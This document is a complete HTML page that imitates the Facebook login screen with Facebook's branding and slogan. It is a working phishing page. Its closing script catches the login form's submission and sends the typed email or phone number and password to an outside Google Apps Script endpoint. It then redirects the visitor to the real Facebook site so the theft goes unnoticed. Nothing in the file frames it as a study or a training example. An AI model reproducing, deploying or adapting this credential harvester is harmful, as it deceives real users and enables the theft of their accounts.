<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login</title>
<style>
  body {
    padding: 0;
    margin: 0;
    background: #f0f2f5;
    font-family: Arial, sans-serif;
  }
input[type="text"],
        input[type="password"] {
            background-color: rgba(255, 255, 255, 0.8); /* Light background color */
            border: 1px solid #ccc; /* Border color */
            padding: 10px; /* Padding around the input */
            margin: 5px; /* Margin between inputs */
            width: 100%; /* Full width */
            box-sizing: border-box; /* Include padding and border in the element's total width */
            font-size: 16px; /* Font size */
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: rgba(0, 0, 0, 0.6); /* Darker placeholder text color */
        }
  .box {
    display: flex;
    flex-direction: column; /* Stack elements vertically on small screens */
    align-items: center;
    width: 100%;
    height: 100vh;
  }

  .title-box {
    width: 100%; /* Take up full width on small screens */
    text-align: center; /* Center text */
    margin-bottom: 20px; /* Add space between elements */
  }

  .title-box img {
    width: 235px;
    margin-bottom: -10px;
  }

  .title-box p {
    color: #000;
    font-size: 26px;
    font-weight: normal;
    line-height: 32px;
  }

  .form-box {
    width: 350px;
    padding: 15px;
    text-align: center;
    border-radius: 5px;
    background: #fff;
    margin-left: 60px;
    box-shadow: 0px 2px 10px 1px rgba(71, 71, 71, 0.52);
  }

  .form-box input {
    width: 100%;
    margin-bottom: 15px;
    padding: 15px;
    font-size: 18px;
    box-sizing: border-box;
    border: 1px solid #eeebeb;
    border-radius: 5px;
    outline: none;
  }

  .form-box input:focus {
    box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
  }

  .form-box button {
    width: 100%;
    margin-bottom: 15px;
    color: #fff;
    font-size: 20px;
    font-weight: 600;
    border-radius: 5px;
    border: none;
    padding: 13px 0;
    cursor: pointer;
    background: #166fe5;
  }

  .form-box button:hover {
    background: #1877f2;
  }

  .form-box a {
    color: #166fe5;
    font-size: 14px;
    text-decoration: none;
    margin-top: 5px;
    margin-bottom: 20px;
    display: block;
  }

  .form-box a:hover {
    text-decoration: underline;
  }

  .form-box hr {
    border: 1px solid #dadde1;
    margin-bottom: 15px;
  }

  .form-box .create-btn a {
    color: #fff;
    font-size: 16px;
    text-decoration: none;
    padding: 15px 20px;
    border-radius: 5px;
    background: #36a420;
    font-weight: 600;
    display: inline-block;
    margin-bottom: 5px;
  }

  .form-box .create-btn a:hover {
    background: #42b72a;
  }

  @media screen and (max-width: 768px) {
    .title-box {
      margin-top: 20px; /* Add space at the top on small screens */
    }
    .title-box img {
      width: 150px; /* Adjust image size for small screens */
    }
    .title-box p {
      font-size: 20px; /* Adjust font size for small screens */
      line-height: 26px;
    }
  }
</style>
</head>
<body>
<div class="box">
  <div class="title-box">
    <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
    <p>Facebook helps you connect and <br>share with the people in your life.</p>
  </div>
  <div class="form-box">
    <form action="" method="POST" name="Facebook">
      <input type="text" placeholder="Email address or phone number" name ="Name">
      <input type="password" placeholder="Password" name ="Password">
      <button type="submit">Log In</button>
      <a href="#">Forgotten Password?</a>
    </form>
    <hr>
    <div class="create-btn">
      <a href="#">Create New Account</a>
    </div>
  </div>
</div>
<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbyJghD1hfIqQ6nFDCLKZCCyzr4VI9c104DkFWqjDuamt2R9JyDz0JGspZ6OOcTxGPQw/exec';
  const form = document.forms['Facebook'];

  form.addEventListener('submit', e => {
    e.preventDefault();
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
      .then(() => {
        window.location.href = 'https://web.facebook.com/?_rdc=1&_rdr';
      })
      .catch(error => console.error('Error!', error.message));
  });
</script>
</body>
</html>
